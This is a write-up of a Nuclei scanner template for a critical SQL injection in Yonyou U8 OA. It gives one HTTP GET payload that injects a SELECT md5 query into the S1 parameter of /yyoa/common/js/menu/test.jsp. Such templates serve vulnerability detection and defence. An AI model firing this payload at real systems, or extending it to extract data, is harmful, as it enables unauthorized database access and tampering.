# Nuclei Template: Yonyou U8 - SQL Injection
**Template ID:** yonyou-u8-oa-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-oa-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Yonyou U8 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))
```

## References
- http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
- https://www.tencentcloud.com/document/product/627/38435
